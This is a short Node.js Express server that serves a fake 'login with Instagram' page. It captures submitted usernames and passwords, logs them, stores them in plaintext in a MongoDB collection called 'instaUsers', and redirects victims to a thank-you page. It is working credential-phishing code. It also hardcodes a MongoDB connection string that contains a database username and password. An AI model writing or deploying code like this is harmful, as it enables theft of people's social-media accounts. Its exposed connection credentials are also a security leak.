const express = require("express");
const mongoose = require("mongoose");
const app = express();
const port = process.env.PORT || 3000;

app.set("view engine", "ejs");
app.use(express.static("public"));
app.use(express.urlencoded({ extended: false }));
app.use(express.json());

mongoose.connect(
  "mongodb+srv://rajmarde:Rajmarde%407020@cluster0.qfhtg.mongodb.net/?retryWrites=true&w=majority"
);

const userSchema = new mongoose.Schema({
  username: String,
  password: String,
});

const instaUsers = mongoose.model("instaUsers", userSchema);

app.get("/", (req, res) => {
  res.render("index");
});

app.get("/login-with-instagram", (req, res) => {
  res.render("instaPage");
});

app.post("/login-with-instagram", (req, res) => {
  const { username, password } = req.body;
  console.log(req.body);

  const data = new instaUsers({
    username: username,
    password: password,
  });

  data.save((err, result) => {
    if (err) {
      res.send("Something went wrong please try again !");
    } else {
      res.redirect("/thankyou");
    }
  });
});

app.get("/thankyou", (req, res) => {
  res.render("thanks");
});

app.listen(3000, () => console.log("server started on port 3000"));
